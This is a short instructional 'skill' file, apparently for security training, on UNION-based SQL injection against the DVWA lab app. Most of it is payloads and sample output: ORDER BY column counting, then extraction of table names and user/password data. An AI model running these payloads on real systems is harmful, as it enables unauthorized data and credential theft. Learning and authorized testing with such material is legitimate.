# SQL Injection Column Count — Exploitation Skill

How to determine column count for UNION-based SQL injection:

1. You already confirmed SQLi exists (error or boolean differential)
2. Try: `ORDER BY 1--` (success), `ORDER BY 2--` (success), `ORDER BY 3--`...
3. STOP as soon as you get an error — the last successful number is
   the column count
4. IMPORTANT: Compare response SIZES not content — success responses
   have similar sizes, error responses are different sizes
5. Maximum 10 attempts. If `ORDER BY 10` still works, switch to
   `UNION SELECT NULL,NULL,...` approach instead
6. Once you know column count N, use:
   `UNION SELECT 1,2,...,N--` to find which columns display in output
7. Then extract data: `UNION SELECT table_name,NULL FROM
   information_schema.tables--`

## Size Comparison Technique

```
ORDER BY 1--  → 4832 bytes (success baseline)
ORDER BY 2--  → 4832 bytes (same = success)
ORDER BY 3--  → 3201 bytes (DIFFERENT = error → column count is 2)
```

## After Finding Column Count

```
# Find which columns are visible in output
1' UNION SELECT 'aaa','bbb'--
→ Response shows: "First name: aaa, Surname: bbb"
→ Both columns 1 and 2 are visible

# Extract database version
1' UNION SELECT version(),database()--
→ "First name: 5.7.26, Surname: dvwa"

# Extract table names
1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
→ "First name: users, Surname: "

# Extract column names
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Extract data
1' UNION SELECT user,password FROM users--
```

## Common Pitfalls

- Forgetting the comment terminator (`--` or `#`) to neutralize trailing SQL
- Using `UNION SELECT` without matching the exact column count
- Not URL-encoding spaces and special characters in GET parameters
- Trying `UNION SELECT` before confirming the exact column count
